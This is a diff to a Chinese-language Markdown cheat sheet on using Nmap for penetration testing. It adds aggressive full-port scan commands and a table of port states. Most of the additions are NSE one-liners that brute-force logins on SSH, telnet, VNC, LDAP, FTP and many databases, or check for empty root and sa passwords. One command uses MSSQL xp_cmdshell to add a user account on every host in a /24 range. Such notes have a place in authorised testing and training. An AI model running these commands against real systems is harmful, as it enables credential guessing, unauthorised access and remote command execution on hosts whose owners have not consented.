@@ -11,12 +11,19 @@
 ## Reference
 
 - [Nmap参考指南(Man Page)](https://nmap.org/man/zh/)
+- [Nmap 进阶使用 [ 脚本篇 ]](https://www.freebuf.com/column/149716.html)
 - Nmap渗透测试思维导图 [png](../文件/Nmap渗透测试思维导图.png)
 
 ---
 
 # 用法
 `nmap -T5 -A -vv xx.xx.xx.xx` 这条命令的意思是往死里扫，管 TM 封不封地址
+
+TCP1：`nmap -Pn -sS --stats-every 3m --max-scan-delay 20 -T4 -p1-65535 ip -oN 路径`
+
+TCP2：`nmap -nvv -Pn -sSV -p 端口 --version-intensity 9 -A ip -oN 路径`
+
+UDP：`nmap -Pn --top-ports 1000 -sU --stats-every 3m -T3 ip -oN 路径`
 
 ## 常用参数
 
@@ -39,6 +46,18 @@
 --script=vuln  利用脚本漏洞探测
 --script=>>>>>>>   调用一个脚本
 -oG  nmap.txt  将结果保存到 nmap.txt
+```
+
+**返回值**
+```
+|返回状态            |说明
+| ----------------- |-----
+|open               |端口开启，数据有到达主机，有程序在端口上监控
+|close              |端口关闭，数据有到达主机，没有程序在端口上监控
+|filtered           |未到达主机，返回的结果为空，被防火墙或IDS过滤
+|unfiltered         |到达主机，但是不能识别端口当前状态
+|open\|filtered     |端口没有返回值，主要发生在UDP，IP，FIN，NULL和Xmas扫描
+|closed\|filtered   |只发生在IP，ID，idle扫描
 ```
 
 ---
@@ -107,6 +126,7 @@ nmap 默认发送一个 ARP 的 PING 数据包，来探测目标主机 1-10000 �
 ---
 
 ## 脚本
+### 常见
 - **[smb-enum-users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)** - 用于枚举SMB用户
     ```
     nmap --script smb-enum-users.nse -p445 <host>
@@ -125,21 +145,43 @@ nmap 默认发送一个 ARP 的 PING 数据包，来探测目标主机 1-10000 �
 
     `nmap -p-80 --script=auth www.xxx.com`
 
-- SSH 爆破
+- rsync
 
-    `nmap -p22 --script ssh-brute www.xxx.com`
+    爆破
 
-- FTP 服务信息
+    `nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' xxx.xxx.xxx.xxx/24`
+
+- vnc
+
+    爆破
+
+    `nmap --script vnc-brute -p 5900 xxx.xxx.xxx.xxx/24`
+
+- SSH
+
+    爆破
+
+    `nmap -p22 --script ssh-brute xxx.xxx.xxx.xxx`
+
+- telnet
+
+    爆破
+
+    `nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v xxx.xxx.xxx.xxx/24`
+
+- ldap
+
+    爆破
+
+    `nmap -p 389 --script ldap-brute --script-args ldap.base='cn=users,dc=cqure,dc=net' xxx.xxx.xxx.xxx/24`
+
+- FTP
 
     `nmap -p21 --script ftp-syst xxx.xxx.xxx.xxx`
 
     爆破
 
     `nmap -p21 xxx.xxx.xxx.xxx --script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/pass.txt`
-
-- MySQL 信息
-
-    `nmap -p3306 --script mysql-enum xxx.xxx.xxx.xxx`
 
 - SNMP
 
@@ -156,3 +198,60 @@ nmap 默认发送一个 ARP 的 PING 数据包，来探测目标主机 1-10000 �
 
 - 截图
     - [Nmap-Tools/NSE/http-screenshot.nse](https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse)
+
+- dns 域传送
+
+    `nmap -p 53 --script dns-zone-transfer.nse -v xxx.xxx.xxx.xxx`
+
+### 数据库
+- MySQL
+
+    `nmap -p3306 --script mysql-enum xxx.xxx.xxx.xxx`
+
+    mysql 扫描 root 空密码
+
+    `nmap -p 3306 --script mysql-empty-password.nse -v xxx.xxx.xxx.xxx`
+
+    mysql root 弱口令简单爆破
+
+    `nmap -p 3306 --script mysql-brute.nse -v xxx.xxx.xxx.xxx`
+
+- mssql
+
+    扫描 sa 空密码
+
+    `nmap -p 1433 --script ms-sql-empty-password.nse -v xxx.xxx.xxx.xxx/24`
+
+    sa 弱口令爆破
+
+    `nmap -p 1433 --script ms-sql-brute.nse -v xxx.xxx.xxx.xxx/24`
+
+    利用 xp_cmdshell,远程执行系统命令
+
+    `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add xxx.xxx.xxx.xxx/24`
+
+- postgresql
+
+    爆破
+
+    `nmap -p 5432 --script pgsql-brute -v xxx.xxx.xxx.xxx/24`
+
+- oracle
+
+    爆破
+
+    `nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v xxx.xxx.xxx.xxx/24`
+
+    `nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v xxx.xxx.xxx.xxx/24`
+
+- mongdb
+
+    爆破
+
+    `nmap -p 27017  --script mongodb-brute xxx.xxx.xxx.xxx/24`
+
+- redis
+
+    爆破
+
+    `nmap -p 6379 --script redis-brute.nse xxx.xxx.xxx.xxx/24`
